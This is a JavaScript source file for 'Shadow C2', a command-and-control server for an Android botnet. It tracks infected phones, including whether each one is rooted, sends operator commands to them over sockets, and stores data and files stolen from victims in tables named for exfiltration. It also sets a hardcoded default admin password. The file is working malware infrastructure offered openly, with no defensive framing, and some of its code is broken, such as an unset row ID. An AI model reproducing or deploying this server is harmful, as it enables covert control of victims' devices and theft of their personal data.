// server.js - Advanced C2 Server
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const multer = require('multer');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

class ShadowC2Server {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.io = socketIo(this.server);
        this.db = null;
        this.connectedBots = new Map();
        this.encryptionKey = crypto.randomBytes(32);
        
        this.initializeServer();
        this.setupDatabase();
        this.setupRoutes();
        this.setupSocketHandlers();
    }

    initializeServer() {
        this.app.use(bodyParser.json({ limit: '50mb' }));
        this.app.use(bodyParser.urlencoded({ extended: true }));
        this.app.use(express.static('public'));
        
        // Middleware for authentication
        this.app.use((req, res, next) => {
            if (req.path === '/login' || req.path === '/auth') {
                return next();
            }
            this.authenticateToken(req, res, next);
        });
    }

    setupDatabase() {
        this.db = new sqlite3.Database('./shadow_c2.db');
        
        this.db.serialize(() => {
            // Bots table
            this.db.run(`CREATE TABLE IF NOT EXISTS bots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT UNIQUE,
                ip_address TEXT,
                country TEXT,
                device_model TEXT,
                android_version TEXT,
                is_rooted INTEGER,
                last_seen DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`);

            // Commands table
            this.db.run(`CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                command_type TEXT,
                command_data TEXT,
                status TEXT,
                result TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME
            )`);

            // Exfiltrated data table
            this.db.run(`CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                data_type TEXT,
                data_content TEXT,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`);

            // Users table for admin panel
            this.db.run(`CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password_hash TEXT,
                role TEXT DEFAULT 'admin',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )`);

            // Insert default admin user
            const defaultPassword = bcrypt.hashSync('shadow2024', 10);
            this.db.run(`INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)`, 
                ['admin', defaultPassword]);
        });
    }

    setupRoutes() {
        // Admin panel routes
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
        });

        this.app.post('/auth', (req, res) => {
            const { username, password } = req.body;
            
            this.db.get("SELECT * FROM users WHERE username = ?", [username], (err, user) => {
                if (err || !user) {
                    return res.status(401).json({ error: 'Invalid credentials' });
                }

                if (bcrypt.compareSync(password, user.password_hash)) {
                    const token = jwt.sign({ username: user.username, role: user.role }, this.encryptionKey);
                    res.json({ token, username: user.username });
                } else {
                    res.status(401).json({ error: 'Invalid credentials' });
                }
            });
        });

        // API routes for bot management
        this.app.get('/api/bots', (req, res) => {
            this.db.all("SELECT * FROM bots ORDER BY last_seen DESC", (err, rows) => {
                if (err) {
                    return res.status(500).json({ error: err.message });
                }
                res.json(rows);
            });
        });

        this.app.get('/api/bot/:id', (req, res) => {
            const botId = req.params.id;
            
            this.db.get("SELECT * FROM bots WHERE bot_id = ?", [botId], (err, bot) => {
                if (err) {
                    return res.status(500).json({ error: err.message });
                }
                
                this.db.all("SELECT * FROM commands WHERE bot_id = ? ORDER BY created_at DESC LIMIT 50", [botId], (err, commands) => {
                    if (err) {
                        return res.status(500).json({ error: err.message });
                    }
                    
                    this.db.all("SELECT * FROM exfiltrated_data WHERE bot_id = ? ORDER BY created_at DESC LIMIT 100", [botId], (err, data) => {
                        if (err) {
                            return res.status(500).json({ error: err.message });
                        }
                        
                        res.json({ bot, commands, data });
                    });
                });
            });
        });

        this.app.post('/api/command', (req, res) => {
            const { botId, commandType, commandData } = req.body;
            
            const commandId = this.generateCommandId();
            const socket = this.connectedBots.get(botId);
            
            if (!socket) {
                return res.status(404).json({ error: 'Bot not connected' });
            }

            // Save command to database
            this.db.run(
                "INSERT INTO commands (bot_id, command_type, command_data, status) VALUES (?, ?, ?, ?)",
                [botId, commandType, commandData, 'pending']
            );

            // Send command to bot
            socket.emit('command', {
                id: commandId,
                type: commandType,
                data: commandData
            });

            res.json({ success: true, commandId });
        });

        this.app.get('/api/data/:type', (req, res) => {
            const dataType = req.params.type;
            const botId = req.query.botId;
            
            let query = "SELECT * FROM exfiltrated_data WHERE data_type = ?";
            let params = [dataType];
            
            if (botId) {
                query += " AND bot_id = ?";
                params.push(botId);
            }
            
            query += " ORDER BY created_at DESC LIMIT 100";
            
            this.db.all(query, params, (err, rows) => {
                if (err) {
                    return res.status(500).json({ error: err.message });
                }
                res.json(rows);
            });
        });

        // File upload handling
        const storage = multer.diskStorage({
            destination: (req, file, cb) => {
                const uploadDir = './uploads';
                if (!fs.existsSync(uploadDir)) {
                    fs.mkdirSync(uploadDir, { recursive: true });
                }
                cb(null, uploadDir);
            },
            filename: (req, file, cb) => {
                cb(null, Date.now() + '-' + file.originalname);
            }
        });

        const upload = multer({ storage });
        this.app.post('/api/upload', upload.single('file'), (req, res) => {
            res.json({ success: true, filePath: req.file.path });
        });
    }

    setupSocketHandlers() {
        this.io.on('connection', (socket) => {
            console.log('New connection:', socket.id);

            // Bot registration
            socket.on('register', (botData) => {
                const botId = this.generateBotId();
                const botInfo = {
                    id: botId,
                    socketId: socket.id,
                    ...botData,
                    lastSeen: new Date()
                };

                this.connectedBots.set(botId, socket);
                
                // Save bot to database
                this.db.run(
                    `INSERT OR REPLACE INTO bots 
                    (bot_id, ip_address, country, device_model, android_version, is_rooted, last_seen) 
                    VALUES (?, ?, ?, ?, ?, ?, ?)`,
                    [
                        botId,
                        botData.ip,
                        botData.country,
                        botData.deviceModel,
                        botData.androidVersion,
                        botData.isRooted ? 1 : 0,
                        new Date().toISOString()
                    ]
                );

                socket.emit('registered', { botId });
                console.log(`Bot registered: ${botId}`);
            });

            // Command results
            socket.on('command_result', (data) => {
                this.db.run(
                    "UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE bot_id = ? AND command_data = ?",
                    ['completed', data.result, new Date().toISOString(), data.botId, data.commandData]
                );

                // Broadcast to all connected dashboards
                this.io.emit('command_update', data);
            });

            // Data exfiltration
            socket.on('exfiltrate_data', (data) => {
                this.db.run(
                    "INSERT INTO exfiltrated_data (bot_id, data_type, data_content) VALUES (?, ?, ?)",
                    [data.botId, data.type, data.content]
                );

                // Save files to disk if needed
                if (data.fileData) {
                    const filePath = `./uploads/${data.botId}_${Date.now()}_${data.type}.bin`;
                    fs.writeFileSync(filePath, Buffer.from(data.fileData, 'base64'));
                    
                    this.db.run(
                        "UPDATE exfiltrated_data SET file_path = ? WHERE id = ?",
                        [filePath, this.lastInsertRowId]
                    );
                }

                this.io.emit('data_update', data);
            });

            // Bot heartbeat
            socket.on('heartbeat', (botId) => {
                this.db.run(
                    "UPDATE bots SET last_seen = ? WHERE bot_id = ?",
                    [new Date().toISOString(), botId]
                );
            });

            socket.on('disconnect', () => {
                for (let [botId, botSocket] of this.connectedBots.entries()) {
                    if (botSocket.id === socket.id) {
                        this.connectedBots.delete(botId);
                        console.log(`Bot disconnected: ${botId}`);
                        break;
                    }
                }
            });
        });
    }

    authenticateToken(req, res, next) {
        const authHeader = req.headers['authorization'];
        const token = authHeader && authHeader.split(' ')[1];

        if (!token) {
            return res.status(401).json({ error: 'Access token required' });
        }

        jwt.verify(token, this.encryptionKey, (err, user) => {
            if (err) {
                return res.status(403).json({ error: 'Invalid token' });
            }
            req.user = user;
            next();
        });
    }

    generateBotId() {
        return 'BOT_' + crypto.randomBytes(8).toString('hex').toUpperCase();
    }

    generateCommandId() {
        return 'CMD_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
    }

    start(port = 3000) {
        this.server.listen(port, () => {
            console.log(`🎯 Shadow C2 Server running on port ${port}`);
            console.log(`🔐 Admin Panel: http://localhost:${port}`);
            console.log(`📊 Dashboard: http://localhost:${port}/dashboard.html`);
        });
    }
}

// Start the server
const c2Server = new ShadowC2Server();
c2Server.start(process.env.PORT || 3000);